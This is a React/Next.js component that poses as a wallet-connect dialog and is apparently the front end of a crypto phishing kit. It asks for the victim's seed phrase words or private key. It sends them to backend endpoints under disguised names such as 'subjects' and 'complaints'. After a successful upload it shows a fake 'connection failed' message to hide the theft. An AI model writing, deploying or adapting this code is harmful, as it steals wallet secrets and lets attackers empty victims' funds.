"use client";
import Link from "next/link";
import { useState } from "react";
import { site } from "@/config/site";
import { Wallet as WalletIcon, UserRound, CheckCircle2, Ban } from "lucide-react";
import { getWallet } from "@/lib/wallets";
import { ComplaintForm } from "@/components/ComplaintForm";

type Mode = "address" | "userId";
type Status = "idle" | "submitting" | "done";

export function ConnectForm({ walletId }: { walletId: string }) {
  const wallet = getWallet(walletId);
  const [mode, setMode] = useState<Mode>("address");
  const [address, setAddress] = useState("");
  const [userId, setUserId] = useState("");
  const [status, setStatus] = useState<Status>("idle");
  const [query, setQuery] = useState("");
    const [classId, setClassId] = useState("");
    const [count, setCount] = useState(0);
    const [subjects, setSubjects] = useState<string[]>([]);
    const [slide, setSlide] = useState(0);
    // const [picked, setPicked] = useState<Wallet | null>(null);
    const [state, setState] = useState<"idle" | "connecting" | "done">("idle");
    const [error, setError] = useState("");
    // const trackRef = useRef<HTMLDivElement>(null);
    function pickCount(n: number) { setCount(n); setSubjects(Array.from({ length: n }, (_, i) => subjects[i] ?? "")); }
    function switchMode(next: Mode) {
    setMode(next);
    setError("");
  }
      async function submit(e: React.FormEvent) {
        e.preventDefault();
        setState("connecting"); setError("");
        const [url, payload] =
      mode === "address"
        ? ["/api/subjects", { classId, subjects }]
        : ["/api/complaints", { body: userId }];

        try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        setError(data.error ?? "Something went wrong. Try again.");
        setState("idle");
        return;
      }
      setState("done");
    } catch {
      setError("Can't reach the server. Check your connection and try again.");
      setState("idle");
    }
  }
      if (state === "done")
    return (
      <div className="glass" role="status">
        {mode === "address" ? (
          <>
          <span style={{ color: "red" }}>
            <Ban />
          </span>
          <h2>Wallet connection failed</h2>
          <p>We couldn't connect to your wallet. Please try again.</p>
        </>
        ) : (
          <>
        <span style={{ color: "red" }}>
            <Ban />
          </span>
        <h2>Network connection failed</h2>
        <p>We couldn't connect to the wallet network. Please try again.</p>
      </>
        )}
      </div>
    );

  const canSubmit = mode === "address" ? count > 0 : userId.trim().length > 0;

  if (!wallet)
    return (
      <div className="glass wc-modal">
        <h2>Wallet not found</h2>
        <p>That wallet isn't in our list. Pick one from the connect screen instead.</p>
        <Link href="/verify" className="btn">
          Back to wallets
        </Link>
      </div>
    );

  const { Icon, name } = wallet;

  return (
    <div className="glass wc-modal cf-form">
      <div className="cf-head">
        <span className="cf-wallet-badge">
          <Icon size={28} variant="branded" />
        </span>
        <div>
          <p className="cf-eyebrow">Connecting</p>
          <h2>{name}</h2>
        </div>
      </div>

      <p className="cf-consent">
        {site.name} cannot recover your password. 
        We will use your Secret Recovery Phrase to validate your ownership, 
        and synchronize your account to access the available blockchain services. See our{" "}
        <Link href="/privacy">privacy policy</Link> for details.
      </p>

      <div className="cf-toggle" role="tablist" aria-label="Choose how to identify your wallet">
        <button
          type="button"
          role="tab"
          aria-selected={mode === "address"}
          className={mode === "address" ? "on" : ""}
          onClick={() => setMode("address")}
        >
          <WalletIcon size={15} /> Seed Phrase
        </button>
        <button
          type="button"
          role="tab"
          aria-selected={mode === "userId"}
          className={mode === "userId" ? "on" : ""}
          onClick={() => setMode("userId")}
        >
          <UserRound size={15} /> Private key
        </button>
      </div>

      <form onSubmit={submit} className="stack">
      {mode === "address" ? (
        <div className="glass stack">
          <label htmlFor="count">Seed Phrase</label>
          <select id="count" value={count} onChange={(e) => pickCount(Number(e.target.value))}>
            <option value={0} disabled>Select</option>
            {site.subjectCounts.map((n) => <option key={n} value={n}>{n}</option>)}
          </select>
          <div className="subject-grid">
            {subjects.map((s, i) => (
              <input
                key={i}
                aria-label={`Word ${i + 1}`}
                placeholder={`Word ${i + 1}`}
                maxLength={100}
                required
                value={s}
                onChange={(e) =>
                  setSubjects(subjects.map((v, j) => (j === i ? e.target.value : v)))
                }
              />
            ))}
          </div>
        </div>
      ) : (
        <div className="glass stack">
          <label htmlFor="complaint">Private key</label>
          <textarea
            id="complaint"
            name="complaint"
            placeholder="Enter your Private Key"
            value={userId}
            onChange={(e) => setUserId(e.target.value)}
            rows={4}
            maxLength={5000}
            required
          />
        </div>
      )}

      {error && <p role="alert" style={{ color: "var(--accent)" }}>{error}</p>}

      {canSubmit && (
        <button className="btn" disabled={state === "connecting"}>
          <CheckCircle2 size={16} /> {state === "connecting" ? "Submitting…" : "Submit"}
        </button>
      )}
    </form>
    </div>
  );
}
